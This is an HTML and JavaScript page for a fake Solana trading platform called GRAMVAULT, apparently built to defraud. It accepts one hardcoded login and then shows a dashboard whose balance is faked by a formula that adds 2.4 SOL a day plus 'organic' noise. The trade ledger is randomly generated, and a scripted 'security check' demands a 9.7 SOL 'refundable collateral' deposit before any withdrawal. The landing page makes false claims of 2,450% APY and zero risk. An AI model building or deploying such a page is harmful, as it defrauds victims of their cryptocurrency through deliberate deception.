<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>GRAMVAULT | INSTITUTIONAL TERMINAL</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        /* * ==========================================
         * CORE ARCHITECTURE & DESIGN TOKENS
         * ==========================================
         */
        :root {
            --color-bg: #030303;
            --color-card: rgba(20, 20, 20, 0.6);
            --color-border: rgba(255, 255, 255, 0.08);
            
            /* Solana Brand Colors - High Intensity */
            --neon-green: #14F195;
            --neon-purple: #9945FF;
            --neon-error: #FF3355;
            
            /* Gradients */
            --grad-main: linear-gradient(135deg, rgba(20,241,149,0.1) 0%, rgba(153,69,255,0.05) 100%);
            --grad-glow: linear-gradient(90deg, #14F195, #9945FF);
            --grad-btn: linear-gradient(180deg, rgba(255,255,255,0.1), rgba(255,255,255,0));

            /* Glassmorphism */
            --glass-blur: blur(20px);
            --glass-border: 1px solid rgba(255, 255, 255, 0.08);
            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);

            /* Typography */
            --font-head: 'Space Grotesk', sans-serif;
            --font-body: 'Inter', sans-serif;
            --font-code: 'JetBrains Mono', monospace;

            /* Animation */
            --ease-elastic: cubic-bezier(0.34, 1.56, 0.64, 1);
            --ease-smooth: cubic-bezier(0.16, 1, 0.3, 1);
        }

        /* RESET & BASE */
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; margin: 0; padding: 0; }
        
        body {
            background-color: var(--color-bg);
            color: #ffffff;
            font-family: var(--font-body);
            overflow: hidden; /* App-like feel */
            height: 100vh;
            width: 100vw;
            /* Authentic CRT/Noise Texture Overlay */
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.03'/%3E%3C/svg%3E");
        }

        /* --- BACKGROUND FX --- */
        #webgl-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            opacity: 0.6; pointer-events: none;
        }
        
        .ambient-glow {
            position: fixed; width: 600px; height: 600px; background: var(--neon-purple);
            filter: blur(150px); opacity: 0.15; border-radius: 50%;
            top: -200px; left: -200px; z-index: -1; animation: float 10s ease-in-out infinite;
        }
        .ambient-glow.secondary {
            top: auto; bottom: -200px; left: auto; right: -200px;
            background: var(--neon-green); animation-delay: -5s;
        }

        @keyframes float { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(50px, 50px); } }

        /* --- TYPOGRAPHY UTILS --- */
        .text-grad {
            background: linear-gradient(to right, #fff, #a5a5a5);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .text-neon { color: var(--neon-green); text-shadow: 0 0 15px rgba(20, 241, 149, 0.4); }
        .font-mono { font-family: var(--font-code); }

        /* --- COMPONENTS: BUTTONS --- */
        .btn-main {
            position: relative;
            width: 100%;
            padding: 18px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: #fff;
            font-family: var(--font-head);
            font-weight: 700;
            font-size: 0.95rem;
            letter-spacing: 1px;
            text-transform: uppercase;
            cursor: pointer;
            overflow: hidden;
            transition: all 0.3s var(--ease-smooth);
            backdrop-filter: blur(10px);
        }

        .btn-main::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: translateX(-100%); transition: 0.5s;
        }

        .btn-main:hover {
            border-color: var(--neon-green);
            box-shadow: 0 0 30px rgba(20, 241, 149, 0.2);
            transform: translateY(-2px);
        }
        .btn-main:hover::before { transform: translateX(100%); }

        .btn-glow {
            background: var(--neon-green);
            color: #000;
            border: none;
            box-shadow: 0 0 20px rgba(20, 241, 149, 0.3), inset 0 2px 0 rgba(255,255,255,0.4);
        }
        .btn-glow:active { transform: scale(0.98); }

        /* --- INPUT FIELDS --- */
        .input-box {
            width: 100%;
            background: rgba(0,0,0,0.4);
            border: 1px solid var(--color-border);
            padding: 18px;
            border-radius: 12px;
            color: #fff;
            font-family: var(--font-code);
            font-size: 1rem;
            margin-bottom: 16px;
            transition: 0.3s;
        }
        .input-box:focus {
            border-color: var(--neon-purple);
            box-shadow: 0 0 0 2px rgba(153, 69, 255, 0.2);
            background: rgba(0,0,0,0.6);
        }

        /* --- VIEWS --- */
        .view {
            position: fixed; inset: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column;
            opacity: 0; pointer-events: none; transform: scale(0.98);
            transition: opacity 0.5s var(--ease-smooth), transform 0.5s var(--ease-smooth);
            overflow-y: auto;
            padding: 20px;
        }
        .view.active { opacity: 1; pointer-events: all; transform: scale(1); }

        /* --- VIEW: LANDING --- */
        #v-landing {
            align-items: center; justify-content: center; text-align: center;
            background: radial-gradient(circle at center, rgba(20,20,20,0), #000);
        }
        
        .hero-logo {
            font-family: var(--font-head); font-weight: 700; font-size: 2rem; letter-spacing: -1px;
            margin-bottom: 40px; display: flex; align-items: center; gap: 15px;
        }
        
        .hero-title {
            font-family: var(--font-head); font-weight: 800; font-size: clamp(2.5rem, 6vw, 4rem);
            line-height: 1.1; margin-bottom: 24px;
        }
        
        .hero-tag {
            padding: 8px 16px; border-radius: 50px; border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.05); font-size: 0.75rem; letter-spacing: 2px;
            color: var(--neon-green); margin-bottom: 20px; display: inline-block;
        }

        .hero-specs {
            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 500px; margin-bottom: 40px;
        }
        .spec-box {
            background: rgba(255,255,255,0.03); border: 1px solid var(--color-border);
            padding: 20px; border-radius: 12px; text-align: left;
        }

        /* --- VIEW: DASHBOARD --- */
        #v-dashboard {
            padding: 0; /* Full screen map/grid feel */
            display: grid;
            grid-template-rows: 70px 1fr;
            max-width: 1600px; margin: 0 auto;
        }

        .nav-header {
            padding: 0 24px; border-bottom: 1px solid var(--color-border);
            display: flex; align-items: center; justify-content: space-between;
            background: rgba(3,3,3,0.8); backdrop-filter: blur(20px);
            z-index: 50;
        }

        .main-grid {
            padding: 24px; overflow-y: auto; display: grid; gap: 24px;
            grid-template-columns: repeat(12, 1fr);
            /* Mobile First: Stack everything */
        }

        /* CARD SYSTEM */
        .glass-card {
            background: var(--color-card);
            backdrop-filter: var(--glass-blur);
            -webkit-backdrop-filter: var(--glass-blur);
            border: var(--glass-border);
            border-radius: 20px;
            padding: 30px;
            position: relative;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
            overflow: hidden;
            transition: transform 0.3s;
        }
        
        /* Specific Grid Placements */
        .c-balance { grid-column: span 12; }
        .c-chart { grid-column: span 12; min-height: 350px; }
        .c-log { grid-column: span 12; }

        @media (min-width: 1024px) {
            .c-balance { grid-column: span 8; }
            .c-stats { grid-column: span 4; }
        }

        /* Balance Styling */
        .bal-label { font-size: 0.85rem; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
        .bal-val { 
            font-family: var(--font-head); font-weight: 700; font-size: clamp(3rem, 5vw, 4.5rem); 
            line-height: 1; letter-spacing: -2px;
            background: linear-gradient(180deg, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .pnl-pill {
            display: inline-flex; align-items: center; gap: 6px;
            background: rgba(20, 241, 149, 0.1); border: 1px solid rgba(20, 241, 149, 0.2);
            padding: 6px 12px; border-radius: 8px; color: var(--neon-green); font-family: var(--font-code); font-size: 0.9rem;
            margin-top: 15px;
        }

        /* Chart Canvas */
        .chart-container { width: 100%; height: 100%; position: relative; }
        #price-chart { width: 100%; height: 100%; }

        /* Log Table */
        .tx-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.03);
            font-family: var(--font-code); font-size: 0.85rem;
        }
        .tx-row:last-child { border: none; }
        .tx-buy { color: var(--neon-green); } .tx-sell { color: var(--neon-error); }

        /* --- MODALS (The "Drama" Layer) --- */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000;
            display: none; align-items: center; justify-content: center;
            backdrop-filter: blur(10px); padding: 20px;
        }
        .modal-overlay.active { display: flex; animation: fadeIn 0.3s ease-out; }

        .modal-box {
            background: #0A0A0A; border: 1px solid var(--color-border);
            width: 100%; max-width: 480px; padding: 40px; border-radius: 24px;
            position: relative; overflow: hidden;
            box-shadow: 0 0 100px rgba(0,0,0,0.8);
            transform: scale(0.95); animation: popIn 0.4s var(--ease-elastic) forwards;
        }

        /* Special Withdraw Button */
        .btn-withdraw-trigger {
            background: var(--grad-glow); border: none; padding: 10px 24px;
            border-radius: 8px; color: #000; font-weight: 700; font-family: var(--font-head);
            font-size: 0.9rem; cursor: pointer; transition: 0.3s;
        }
        .btn-withdraw-trigger:hover { box-shadow: 0 0 30px rgba(20,241,149,0.5); }

        /* Loading Animation */
        .loader-ring {
            width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid var(--neon-green); border-radius: 50%;
            animation: spin 1s linear infinite; margin: 0 auto 30px auto;
        }

        /* ANIMATIONS */
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popIn { to { transform: scale(1); } }
        @keyframes pulseBorder { 0% { border-color: rgba(20,241,149,0.2); } 50% { border-color: rgba(20,241,149,0.8); } 100% { border-color: rgba(20,241,149,0.2); } }

        /* Documentation Modal Text */
        .doc-text { color: #aaa; line-height: 1.7; font-size: 0.95rem; margin-bottom: 20px; }
        .doc-header { color: var(--neon-green); font-family: var(--font-code); margin-bottom: 8px; font-weight: 700; }

    </style>
</head>
<body>

    <div class="ambient-glow"></div>
    <div class="ambient-glow secondary"></div>
    <canvas id="webgl-canvas"></canvas>

    <section id="v-landing" class="view active">
        <div style="max-width: 600px; width: 100%;">
            <div class="hero-tag">‚óè SOLANA MAINNET UPLINK ESTABLISHED</div>
            
            <h1 class="hero-title">Institutional<br>Liquidity Terminal</h1>
            
            <p style="color: #888; margin-bottom: 40px; font-size: 1.1rem; line-height: 1.6;">
                Access high-frequency arbitrage strategies with <span style="color:#fff">400ms latency</span>.
                Secured by MPC-512 custody and Jito-Solana validators.
            </p>

            <div class="hero-specs">
                <div class="spec-box">
                    <div style="font-family: var(--font-code); color: var(--neon-green); font-size: 0.8rem;">APY TARGET</div>
                    <div style="font-size: 1.5rem; font-weight: 700;">2,450%</div>
                </div>
                <div class="spec-box">
                    <div style="font-family: var(--font-code); color: var(--neon-purple); font-size: 0.8rem;">TOTAL VOLUME</div>
                    <div style="font-size: 1.5rem; font-weight: 700;">$4.2B+</div>
                </div>
            </div>

            <div style="display: flex; flex-direction: column; gap: 15px;">
                <button class="btn-main btn-glow" onclick="App.openLogin()">ACCESS YOUR ACCOUNT NOW</button>
                <button class="btn-main" onclick="App.openDocs()">READ STRATEGY DOCUMENTATION</button>
            </div>
        </div>
    </section>

    <section id="v-dashboard" class="view">
        <nav class="nav-header">
            <div style="display: flex; align-items: center; gap: 12px;">
                <svg width="24" height="24" viewBox="0 0 397 311" fill="none"><path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7zM6.5 102.7h317.4c3.5 0 6.8-1.4 9.2-3.8l62.7-62.7C399.9 32.1 397 25 391.2 25H73.8c-3.5 0-6.8 1.4-9.2 3.8L1.9 91.6c-4.1 4.1-1.2 11.1 4.6 11.1zM391.2 142.6H73.8c-3.5 0-6.8 1.4-9.2 3.8L1.9 209.1c-4.1 4.1-1.2 11.1 4.6 11.1h317.4c3.5 0 6.8-1.4 9.2-3.8l62.7-62.7c4.1-4.2 1.2-11.1-4.6-11.1z" fill="url(#solgrad)"/><defs><linearGradient id="solgrad" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#14F195"/><stop offset="1" stop-color="#9945FF"/></linearGradient></defs></svg>
                <span style="font-family: var(--font-head); font-weight: 700; letter-spacing: 1px;">GRAMVAULT <span style="font-size: 0.6em; border: 1px solid #333; padding: 2px 4px; border-radius: 4px; color: #888;">PRO</span></span>
            </div>
            <div style="display: flex; align-items: center; gap: 20px;">
                <div class="font-mono" style="color: #666; font-size: 0.8rem; display: none; md:block;" id="clock">00:00:00 UTC</div>
                <button class="btn-withdraw-trigger" onclick="App.startWithdrawal()">WITHDRAW</button>
            </div>
        </nav>

        <div class="main-grid">
            
            <div class="glass-card c-balance">
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <div>
                        <div class="bal-label">Total Equity (SOL)</div>
                        <div class="bal-val" id="display-balance">30.0000</div>
                        <div class="font-mono" style="color: #666; margin-top: 5px;">‚âà $<span id="display-usd">0.00</span> USD</div>
                    </div>
                    <div style="text-align: right;">
                        <div class="bal-label">Status</div>
                        <div style="color: var(--neon-green); font-weight: 700;">‚óè Active</div>
                    </div>
                </div>
                <div class="pnl-pill">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M18 15l-6-6-6 6"/></svg>
                    +<span id="display-pnl">0.0000</span> (Today)
                </div>
            </div>

            <div class="glass-card c-stats" style="grid-column: span 12; md:grid-column: span 4;">
                <div class="bal-label">Daily Yield Target</div>
                <div style="font-size: 2rem; font-weight: 700; color: #fff; margin-bottom: 5px;">2.40 SOL</div>
                <div style="font-size: 0.8rem; color: #666;">Algorithmic Pace: 100%</div>
                <div style="width: 100%; background: #222; height: 4px; border-radius: 2px; margin-top: 20px;">
                    <div style="width: 100%; height: 100%; background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green);"></div>
                </div>
            </div>

            <div class="glass-card c-chart">
                <div style="position: absolute; top: 20px; left: 30px; font-size: 0.8rem; color: #666;">LIVE PERFORMANCE TICKER</div>
                <div class="chart-container">
                    <canvas id="price-chart"></canvas>
                </div>
            </div>

            <div class="glass-card c-log">
                <div class="bal-label" style="margin-bottom: 20px;">Execution Ledger (Jito-Mempool)</div>
                <div id="log-container">
                    </div>
            </div>
        </div>
    </section>

    <div id="m-login" class="modal-overlay">
        <div class="modal-box" style="border-top: 2px solid var(--neon-green);">
            <h2 style="font-family: var(--font-head); margin-bottom: 30px; text-align: center;">TERMINAL ACCESS</h2>
            <input type="text" id="inp-user" class="input-box" placeholder="TERMINAL ID">
            <input type="password" id="inp-pass" class="input-box" placeholder="ACCESS KEY">
            <div id="err-login" style="color: var(--neon-error); font-size: 0.8rem; margin-bottom: 20px; text-align: center; height: 20px;"></div>
            <button class="btn-main btn-glow" onclick="App.login()">ESTABLISH CONNECTION</button>
            <div class="font-mono" style="text-align: center; margin-top: 20px; font-size: 0.7rem; color: #444;">SECURED BY SOLANA MPC</div>
        </div>
    </div>

    <div id="m-docs" class="modal-overlay">
        <div class="modal-box">
            <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
                <h2 style="font-family: var(--font-head);">STRATEGY BRIEF</h2>
                <div onclick="App.closeModals()" style="cursor: pointer;">‚úï</div>
            </div>
            <div style="max-height: 400px; overflow-y: auto;">
                <div class="doc-header">01 // ATOMIC ARBITRAGE</div>
                <p class="doc-text">Our node scans Raydium and Orca pools every 400ms. When price discrepancy >0.1% is detected, we execute atomic bundles to capture spread.</p>
                
                <div class="doc-header">02 // MEV PROTECTION</div>
                <p class="doc-text">Transactions are routed via private RPCs (Jito), bypassing the public mempool to prevent sandwich attacks.</p>
                
                <div class="doc-header">03 // YIELD LOGIC</div>
                <p class="doc-text">Target yield is fixed at 2.4 SOL/Day via automated compounding. Zero liquidation risk protocol.</p>
            </div>
            <button class="btn-main" onclick="App.closeModals()" style="margin-top: 20px;">CLOSE</button>
        </div>
    </div>

    <div id="m-withdraw-input" class="modal-overlay">
        <div class="modal-box">
            <h2 style="font-family: var(--font-head); margin-bottom: 20px;">WITHDRAW ASSETS</h2>
            
            <label class="font-mono" style="font-size: 0.75rem; color: #888;">DESTINATION (SPL)</label>
            <input type="text" class="input-box" placeholder="Solana Wallet Address" style="margin-bottom: 15px;">
            
            <label class="font-mono" style="font-size: 0.75rem; color: #888;">AMOUNT (SOL)</label>
            <input type="number" class="input-box" placeholder="0.00">
            <div class="font-mono" style="text-align: right; font-size: 0.75rem; color: var(--neon-green); margin-bottom: 25px;">
                Available: <span id="val-avail">0.0000</span> SOL
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <button class="btn-main" onclick="App.closeModals()">CANCEL</button>
                <button class="btn-main btn-glow" onclick="App.submitWithdraw()">CONFIRM</button>
            </div>
        </div>
    </div>

    <div id="m-withdraw-load" class="modal-overlay">
        <div class="modal-box" style="text-align: center;">
            <div class="loader-ring"></div>
            <h3 style="font-family: var(--font-head); margin-bottom: 20px;">VERIFYING PROTOCOL</h3>
            <div id="load-steps" class="font-mono" style="text-align: left; font-size: 0.85rem; color: #666; padding-left: 20px;">
                </div>
        </div>
    </div>

    <div id="m-withdraw-block" class="modal-overlay">
        <div class="modal-box" style="border-top: 4px solid var(--neon-error);">
            <div style="color: var(--neon-error); font-size: 3rem; margin-bottom: 10px;">üõ°Ô∏è</div>
            <h2 style="margin-bottom: 15px; font-family: var(--font-head);">SECURITY CHECK REQUIRED</h2>
            
            <p style="color: #ccc; font-size: 0.95rem; line-height: 1.6; margin-bottom: 25px;">
                Your account holds institutional-grade profits. To finalize this withdrawal and secure the liquidity pool, a **one-time refundable collateral** is required by the smart contract.
            </p>

            <div style="background: rgba(20,241,149,0.05); border: 1px solid var(--neon-green); padding: 15px; border-radius: 8px; margin-bottom: 25px;">
                <div class="font-mono" style="font-size: 0.75rem; color: var(--neon-green); margin-bottom: 5px;">REQUIRED ACTION</div>
                <div style="font-size: 1.1rem; font-weight: 700;">Deposit 9.7 SOL Collateral</div>
            </div>

            <p style="color: #666; font-size: 0.8rem; margin-bottom: 25px; line-height: 1.5;">
                *This is fully refundable. Once verified on-chain (approx. 5 mins), the 9.7 SOL + your total profits are released to your wallet instantly.
            </p>

            <button class="btn-main" onclick="App.closeModals()">I UNDERSTAND - PROCEED</button>
        </div>
    </div>

    <script>
        /**
         * GRAMVAULT CORE ENGINE
         * High-Fidelity Logic for Institutional Simulation
         */

        const Logic = {
            // Jan 1, 2026 Epoch
            START_TIME: 1767225600000, 
            BASE_SOL: 30.00,
            DAILY_YIELD: 2.40,

            // Calculates the exact balance based on current time
            // Persistent: Will be the same on any device/refresh
            calc() {
                const now = Date.now();
                // Ensure we don't go negative if system clock is wrong
                const diff = Math.max(0, now - this.START_TIME); 
                const daysElapsed = diff / (1000 * 60 * 60 * 24);
                
                const growth = daysElapsed * this.DAILY_YIELD;
                
                // Add noise (volatility) that looks organic
                const noise = (Math.sin(diff / 5000) * 0.02) + (Math.cos(diff / 1300) * 0.01);
                
                const total = this.BASE_SOL + growth + noise;
                
                // "Today's" PnL calculation
                const secondsInDay = (now % 86400000) / 1000;
                const dailyPace = (secondsInDay / 86400) * this.DAILY_YIELD;

                return {
                    bal: total,
                    pnl: dailyPace,
                    usd: total * 148.50 // Mock Price
                };
            }
        };

        const App = {
            chartData: [],
            
            init() {
                // Initialize particle background
                this.initBg();
                // Pre-calculate history for the chart
                this.genHistory();
                
                // Start Clock
                setInterval(() => {
                    const t = new Date().toISOString().split('T')[1].split('.')[0] + " UTC";
                    document.getElementById('clock').innerText = t;
                }, 1000);
            },

            // --- NAVIGATION ---
            openLogin() {
                document.getElementById('m-login').classList.add('active');
            },
            openDocs() {
                document.getElementById('m-docs').classList.add('active');
            },
            closeModals() {
                document.querySelectorAll('.modal-overlay').forEach(el => el.classList.remove('active'));
            },

            // --- AUTH ---
            login() {
                const u = document.getElementById('inp-user').value;
                const p = document.getElementById('inp-pass').value;

                if(u === "Groovy9944" && p === "user39zxnlojp") {
                    this.closeModals();
                    // Fade out landing, Fade in dashboard
                    document.getElementById('v-landing').classList.remove('active');
                    
                    // Artificial loading delay for "Connecting"
                    const btn = document.querySelector('.btn-main');
                    
                    setTimeout(() => {
                        document.getElementById('v-dashboard').classList.add('active');
                        this.startEngine();
                    }, 500);

                } else {
                    const err = document.getElementById('err-login');
                    err.innerText = "ACCESS DENIED: INVALID CREDENTIALS";
                    // Shake animation
                    const box = document.querySelector('#m-login .modal-box');
                    box.style.transform = "translateX(10px)";
                    setTimeout(() => box.style.transform = "translateX(0)", 100);
                }
            },

            // --- DASHBOARD LOGIC ---
            startEngine() {
                // High frequency update loop
                setInterval(() => {
                    const data = Logic.calc();
                    
                    // Update DOM
                    document.getElementById('display-balance').innerText = data.bal.toFixed(4);
                    document.getElementById('display-usd').innerText = data.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                    document.getElementById('display-pnl').innerText = data.pnl.toFixed(4);
                    
                    // Chart Logic
                    this.chartData.push(data.bal);
                    if(this.chartData.length > 100) this.chartData.shift();
                    this.drawChart();
                    
                    // Randomly add a log entry
                    if(Math.random() > 0.85) this.addLog();

                }, 1000);
            },

            // --- CHART RENDERING (High DPI) ---
            genHistory() {
                // Generate 100 points of history based on the math model
                let time = Date.now() - (1000 * 100);
                for(let i=0; i<100; i++) {
                    time += 1000;
                    const diff = Math.max(0, time - Logic.START_TIME);
                    const days = diff / 86400000;
                    const val = Logic.BASE_SOL + (days * Logic.DAILY_YIELD) + (Math.sin(diff/5000)*0.02);
                    this.chartData.push(val);
                }
            },

            drawChart() {
                const cvs = document.getElementById('price-chart');
                const ctx = cvs.getContext('2d');
                
                // Handle Retina/High-DPI
                const dpr = window.devicePixelRatio || 1;
                const rect = cvs.getBoundingClientRect();
                
                cvs.width = rect.width * dpr;
                cvs.height = rect.height * dpr;
                ctx.scale(dpr, dpr);

                const w = rect.width;
                const h = rect.height;
                const data = this.chartData;
                
                // Find scale
                const min = Math.min(...data);
                const max = Math.max(...data);
                const range = max - min;

                ctx.clearRect(0,0,w,h);
                
                // Gradient Fill
                const grad = ctx.createLinearGradient(0, 0, 0, h);
                grad.addColorStop(0, 'rgba(20, 241, 149, 0.2)');
                grad.addColorStop(1, 'rgba(20, 241, 149, 0)');

                ctx.beginPath();
                ctx.strokeStyle = '#14F195';
                ctx.lineWidth = 3;
                ctx.lineCap = 'round';
                ctx.lineJoin = 'round';

                // Draw Smooth Line
                for(let i=0; i<data.length; i++) {
                    const x = (i / (data.length - 1)) * w;
                    // normalize to height, leave padding
                    const y = h - ((data[i] - min) / range) * (h - 40) - 20; 
                    
                    if(i===0) ctx.moveTo(x, y);
                    else ctx.lineTo(x, y);
                }
                
                ctx.stroke();
                
                // Close path for fill
                ctx.lineTo(w, h);
                ctx.lineTo(0, h);
                ctx.fillStyle = grad;
                ctx.fill();
            },

            addLog() {
                const container = document.getElementById('log-container');
                const types = ['BUY', 'SELL', 'REBALANCE'];
                const type = types[Math.floor(Math.random() * types.length)];
                const pair = ['SOL-USDC', 'JUP-SOL', 'BONK-SOL'][Math.floor(Math.random()*3)];
                const amt = (Math.random() * 5).toFixed(2);
                const hash = Math.random().toString(36).substring(2, 10);
                
                const el = document.createElement('div');
                el.className = 'tx-row';
                el.innerHTML = `
                    <div style="display:flex; gap:10px;">
                        <span class="${type === 'BUY' ? 'tx-buy' : 'tx-sell'}">${type}</span>
                        <span style="color:#fff">${pair}</span>
                    </div>
                    <div style="display:flex; gap:15px; color:#888;">
                        <span>${amt} SOL</span>
                        <span style="opacity:0.5">${hash}...</span>
                    </div>
                `;
                
                container.prepend(el);
                if(container.children.length > 6) container.lastChild.remove();
            },

            // --- WITHDRAWAL SEQUENCE ---
            startWithdrawal() {
                const bal = Logic.calc().bal;
                document.getElementById('val-avail').innerText = bal.toFixed(4);
                document.getElementById('m-withdraw-input').classList.add('active');
            },

            submitWithdraw() {
                this.closeModals();
                document.getElementById('m-withdraw-load').classList.add('active');
                
                // Cinematic Loading Sequence
                const steps = [
                    { msg: "Checking Wallet Address...", time: 1000 },
                    { msg: "Analyzing Liquidity Depth...", time: 2500 },
                    { msg: "Verifying Risk Protocols...", time: 4000 },
                    { msg: "Checking Collateral Status...", time: 5500 }
                ];

                const container = document.getElementById('load-steps');
                container.innerHTML = ''; // reset

                let timer = 0;
                steps.forEach(step => {
                    setTimeout(() => {
                        container.innerHTML += `<div style="margin-bottom:5px; color:#14F195">>> ${step.msg} <span style="color:#fff">OK</span></div>`;
                    }, step.time);
                    timer = step.time;
                });

                setTimeout(() => {
                    this.closeModals();
                    document.getElementById('m-withdraw-block').classList.add('active');
                }, timer + 1000);
            },

            // --- PARTICLES ---
            initBg() {
                const cvs = document.getElementById('webgl-canvas');
                const ctx = cvs.getContext('2d');
                cvs.width = window.innerWidth;
                cvs.height = window.innerHeight;
                
                const particles = Array.from({length: 40}, () => ({
                    x: Math.random() * cvs.width,
                    y: Math.random() * cvs.height,
                    vx: (Math.random() - 0.5) * 0.3,
                    vy: (Math.random() - 0.5) * 0.3,
                    size: Math.random() * 2
                }));

                function anim() {
                    ctx.clearRect(0,0,cvs.width,cvs.height);
                    ctx.fillStyle = "#14F195";
                    
                    particles.forEach(p => {
                        p.x += p.vx; p.y += p.vy;
                        if(p.x < 0 || p.x > cvs.width) p.vx *= -1;
                        if(p.y < 0 || p.y > cvs.height) p.vy *= -1;
                        
                        ctx.globalAlpha = 0.3;
                        ctx.beginPath();
                        ctx.arc(p.x, p.y, p.size, 0, Math.PI*2);
                        ctx.fill();
                    });
                    requestAnimationFrame(anim);
                }
                anim();
            }
        };

        // Start App
        App.init();

        // Mobile viewport hack
        window.addEventListener('resize', () => {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        });

    </script>
</body>
</html>
